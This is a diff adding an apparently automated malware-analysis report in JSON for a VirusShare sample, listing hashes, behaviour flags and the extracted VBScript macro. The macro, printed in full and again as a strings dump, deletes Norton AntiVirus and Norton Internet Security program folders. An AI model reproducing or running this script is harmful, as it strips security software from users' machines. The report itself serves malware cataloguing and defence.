@@ -1,0 +1,47 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "Wscript.shell": "May run an executable file or a system command",
+            "createobject": "May create an OLE object",
+            "shell": "May run an executable file or a system command"
+        },
+        "macro": "Set WShell = createobject (\"Wscript.shell\")\nSet fs = createobject (\"scripting.filesystemobject\")\n\nset ospecfolder = wshell.SpecialFolders\n\nrep = ospecfolder (\"Programs\") & (\"\\Norton AntiVirus\")\nif fs.folderExists (rep)=true then\nfs.deleteFolder (rep)\nend if\n\n\nrep1 = ospecfolder (\"Programs\") & (\"\\Norton Internet Security Family Edition\")\nif fs.folderExists (rep1)=true then\nfs.deleteFolder (rep1)\nend if\n\n\n"
+    },
+    "filename": "VirusShare_2425f4db852c921dc426a99508b63299",
+    "filesize": 426,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "2425f4db852c921dc426a99508b63299",
+        "sha1": "fb9f99e7f5ec8264c677c1c4cc957d3ea5f04290",
+        "sha256": "db42251ccf7d97403ac07617ba89994e16d07ccd1fdf2462043254cbdb7f51c4"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "Set WShell = createobject (\"Wscript.shell\")",
+            "Set fs = createobject (\"scripting.filesystemobject\")",
+            "set ospecfolder = wshell.SpecialFolders",
+            "rep = ospecfolder (\"Programs\") & (\"\\Norton AntiVirus\")",
+            "if fs.folderExists (rep)=true then",
+            "fs.deleteFolder (rep)",
+            "end if",
+            "rep1 = ospecfolder (\"Programs\") & (\"\\Norton Internet Security Family Edition\")",
+            "if fs.folderExists (rep1)=true then",
+            "fs.deleteFolder (rep1)",
+            "end if"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.261387",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
